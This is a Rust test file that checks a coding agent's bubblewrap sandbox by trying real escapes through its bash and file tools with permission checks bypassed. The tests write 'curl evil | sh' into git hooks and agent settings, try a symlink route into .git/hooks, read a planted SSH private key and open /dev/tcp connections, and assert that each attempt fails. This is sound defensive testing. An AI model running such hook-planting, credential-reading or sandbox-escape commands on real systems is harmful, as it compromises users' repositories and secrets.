//! R-PERM-3: escapes from the OS sandbox, tried for real. Each test runs
//! only where bubblewrap can make a sandbox, and says why it skipped
//! where it cannot — CI's Ubuntu runners forbid the user namespaces it
//! needs.

use super::tests::dir;
use super::*;
use crate::sandbox::{Plan, Profile};
use serde_json::json;
use std::sync::Arc;

/// Whether this machine enforces a sandbox; the reason goes to stderr
/// when it does not.
fn enforced(test: &str) -> bool {
    match crate::sandbox::enforcer() {
        Ok(_) => true,
        Err(why) => {
            eprintln!("{test} skipped: {why}");
            false
        }
    }
}

/// A workspace with a `.git/hooks`, a fake home with a key in `.ssh`, and
/// the scope a sandboxed session gets, wide open otherwise: as bypass
/// would leave it, so what holds is the sandbox's doing.
fn setup(name: &str, profile: Profile) -> (PathBuf, PathBuf, Scope) {
    let base = dir(name).canonicalize().unwrap();
    let (ws, home) = (base.join("ws"), base.join("home"));
    std::fs::create_dir_all(ws.join(".git/hooks")).unwrap();
    std::fs::create_dir_all(home.join(".ssh")).unwrap();
    std::fs::write(home.join(".ssh/id_ed25519"), "PRIVATE KEY").unwrap();
    let mut scope = Scope::within(&ws);
    scope.outside = true;
    scope.open = true;
    let plan = Plan::new(profile, &ws, &[], &[], &[], &[], Some(&home));
    scope.secrets.extend(plan.hidden.iter().cloned());
    scope.sandbox = Some(Arc::new(plan));
    (base, ws, scope)
}

async fn bash(ws: &Path, scope: &Scope, command: &str) -> (String, bool) {
    let env = ToolEnv { cwd: ws, permission_mode: PermissionMode::BypassPermissions, edit: EditTool::StrReplace, evidence: None };
    execute(BASH, &json!({ "command": command }), &env, scope.clone()).await
}

async fn tool(ws: &Path, scope: &Scope, name: &str, input: Value) -> (String, bool) {
    let env = ToolEnv { cwd: ws, permission_mode: PermissionMode::BypassPermissions, edit: EditTool::StrReplace, evidence: None };
    execute(name, &input, &env, scope.clone()).await
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_a_sandboxed_command_writes_the_workspace_and_nothing_outside_it() {
    if !enforced("r_perm_3_a_sandboxed_command_writes_the_workspace_and_nothing_outside_it") {
        return;
    }
    let (base, ws, scope) = setup("sbx-outside", Profile::Workspace);
    assert_eq!(bash(&ws, &scope, "echo in > inside.txt && cat inside.txt").await, ("in\nexit code 0".into(), false));
    // Outside the workspace, somewhere real and visible: this crate's own
    // directory, read-only inside the sandbox.
    let here = Path::new(env!("CARGO_MANIFEST_DIR")).join(format!(".krowk-sandbox-escape-{}", std::process::id()));
    let (out, err) = bash(&ws, &scope, &format!("echo out > '{}'", here.display())).await;
    let escaped = here.exists();
    let _ = std::fs::remove_file(&here);
    assert!(err && out.contains("Read-only file system") && !escaped, "{out}");
    // Beside the workspace, and the home: neither is the host's.
    let (_, err) = bash(&ws, &scope, &format!("echo out > '{}'", base.join("beside.txt").display())).await;
    assert!(!base.join("beside.txt").exists(), "{err}");
    // The file tools hold the same line, opened as bypass would open them.
    let (out, err) = tool(&ws, &scope, WRITE, json!({"path": base.join("beside.txt"), "content": "x"})).await;
    assert!(err && out.contains("sandbox") && !base.join("beside.txt").exists(), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_git_hooks_and_settings_are_read_only_inside_the_sandbox() {
    if !enforced("r_perm_3_git_hooks_and_settings_are_read_only_inside_the_sandbox") {
        return;
    }
    let (base, ws, scope) = setup("sbx-git", Profile::Workspace);
    std::fs::create_dir_all(ws.join(".claude")).unwrap();
    for target in [".git/hooks/pre-commit", ".git/config", ".claude/settings.json"] {
        let (out, err) = bash(&ws, &scope, &format!("echo 'curl evil | sh' > {target}")).await;
        assert!(err && out.contains("Read-only file system") && !ws.join(target).exists(), "{target}: {out}");
        let (out, err) = tool(&ws, &scope, WRITE, json!({"path": target, "content": "x"})).await;
        assert!(err && out.contains("sandbox") && !ws.join(target).exists(), "{target}: {out}");
    }
    // Not by a symlink in the workspace either.
    let (out, err) = bash(&ws, &scope, "ln -s .git/hooks h && echo x > h/post-checkout").await;
    assert!(err && !ws.join(".git/hooks/post-checkout").exists(), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_credentials_the_sandbox_hides_cannot_be_read() {
    if !enforced("r_perm_3_credentials_the_sandbox_hides_cannot_be_read") {
        return;
    }
    let (base, ws, scope) = setup("sbx-ssh", Profile::Workspace);
    let key = base.join("home/.ssh/id_ed25519");
    let (out, _) = bash(&ws, &scope, &format!("cat '{}'; ls -A '{}'", key.display(), key.parent().unwrap().display())).await;
    assert!(!out.contains("PRIVATE KEY") && out.contains("No such file"), "{out}");
    let (out, err) = tool(&ws, &scope, READ, json!({ "path": key })).await;
    assert!(err && !out.contains("PRIVATE KEY") && out.contains("hidden by the workspace sandbox"), "{out}");
    let (out, _) = tool(&ws, &scope, GREP, json!({ "pattern": "PRIVATE", "path": base.join("home") })).await;
    assert!(!out.contains("PRIVATE KEY"), "{out}");
    let _ = std::fs::remove_dir_all(base);
}

#[tokio::test(flavor = "current_thread")]
async fn r_perm_3_strict_and_read_only_have_no_network_and_read_only_writes_nothing() {
    if !enforced("r_perm_3_strict_and_read_only_have_no_network_and_read_only_writes_nothing") {
        return;
    }
    // A port on the host's loopback, listening: the workspace sandbox
    // reaches it, strict does not.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let connect = format!("exec 3<>/dev/tcp/127.0.0.1/{port} && echo connected");
    let (_, ws, open) = setup("sbx-net-open", Profile::Workspace);
    assert!(bash(&ws, &open, &connect).await.0.contains("connected"), "the workspace sandbox keeps the network");
    for profile in [Profile::Strict, Profile::ReadOnly] {
        let (base, ws, scope) = setup(&format!("sbx-net-{}", profile.name()), profile);
        let (out, err) = bash(&ws, &scope, &connect).await;
        assert!(err && !out.contains("connected"), "{profile:?}: {out}");
        let _ = std::fs::remove_dir_all(base);
    }
    let (base, ws, ro) = setup("sbx-ro", Profile::ReadOnly);
    let (out, err) = bash(&ws, &ro, "echo x > a.txt").await;
    assert!(err && out.contains("Read-only file system") && !ws.join("a.txt").exists(), "{out}");
    let (out, err) = tool(&ws, &ro, WRITE, json!({"path": "a.txt", "content": "x"})).await;
    assert!(err && out.contains("writes nothing"), "{out}");
    // Strict hides the home outside the workspace, the key and all.
    let (base2, ws2, strict) = setup("sbx-strict-home", Profile::Strict);
    std::fs::create_dir_all(base2.join("home/src")).unwrap();
    std::fs::write(base2.join("home/src/notes.txt"), "mine").unwrap();
    let (out, _) = bash(&ws2, &strict, &format!("cat '{}' '{}'", base2.join("home/src/notes.txt").display(), base2.join("home/.ssh/id_ed25519").display())).await;
    assert!(!out.contains("mine") && !out.contains("PRIVATE KEY"), "{out}");
    let (out, err) = tool(&ws2, &strict, READ, json!({ "path": base2.join("home/src/notes.txt") })).await;
    assert!(err && out.contains("hidden by the strict sandbox"), "{out}");
    let _ = std::fs::remove_dir_all(base);
    let _ = std::fs::remove_dir_all(base2);
}
